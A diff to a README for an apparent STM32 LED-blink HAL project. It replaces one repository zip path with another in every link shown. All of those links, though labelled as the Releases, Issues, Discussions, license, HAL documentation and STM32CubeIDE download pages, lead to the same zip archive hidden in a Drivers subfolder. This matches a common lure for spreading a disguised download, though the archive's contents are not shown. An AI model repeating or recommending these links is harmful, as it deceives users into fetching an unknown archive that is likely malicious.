@@ -1,6 +1,6 @@
 # 🎉 STM32-LED-blink-HAL-coding-method - Blink an LED with Ease
 
-[![Download](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip%20Now-STM32%20LED%20Blink-brightgreen)](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip)
+[![Download](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip%20Now-STM32%20LED%20Blink-brightgreen)](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip)
 
 ## 📦 Overview
 
@@ -26,9 +26,9 @@ To start using this project, follow the steps outlined below. You will download 
 
 ## 📥 Download & Install
 
-To download the project, visit the [Releases page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip). Here, you will find all versions of the software. Choose the latest release for the best features and updates.
+To download the project, visit the [Releases page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip). Here, you will find all versions of the software. Choose the latest release for the best features and updates.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip).
 2. Click on the release you want to download.
 3. Locate the downloadable file in the assets section and click to start the download.
 
@@ -60,16 +60,16 @@ The LED should start blinking as per the configurations in the project!
 
 If you have questions or need assistance, feel free to reach out. Here are ways to get in touch:
 
-- **Issues**: Report any issues on the [Issues page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip).
-- **Discussions**: Join discussions or start your own on the [Discussions page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip).
+- **Issues**: Report any issues on the [Issues page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip).
+- **Discussions**: Join discussions or start your own on the [Discussions page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip).
 
 ## 🧑‍💻 Contributing
 
-If you would like to contribute to this project, check the guidelines in `https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip` within the repository. Your contributions can help improve this project and assist others in learning.
+If you would like to contribute to this project, check the guidelines in `https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip` within the repository. Your contributions can help improve this project and assist others in learning.
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can use, modify, and distribute it freely as per the terms of the license. See `https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip` for details.
+This project is licensed under the MIT License. You can use, modify, and distribute it freely as per the terms of the license. See `https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip` for details.
 
 ## 🎯 Next Steps
 
@@ -79,7 +79,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Useful Links
 
-- [STM32 HAL Documentation](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip)
-- [STM32CubeIDE Download](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip)
+- [STM32 HAL Documentation](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip)
+- [STM32CubeIDE Download](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip)
 
-For more updates, keep checking the [Releases page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/CMSIS/Device/ST/ST_blink_HA_coding_method_LE_v3.1.zip) as we add new features and improvements.
+For more updates, keep checking the [Releases page](https://raw.githubusercontent.com/DUSGAMER23/STM32-LED-blink-HAL-coding-method/main/Drivers/STM32F4xx_HAL_Driver/Inc/Legacy/HA_method_coding_ST_blink_LE_2.9.zip) as we add new features and improvements.
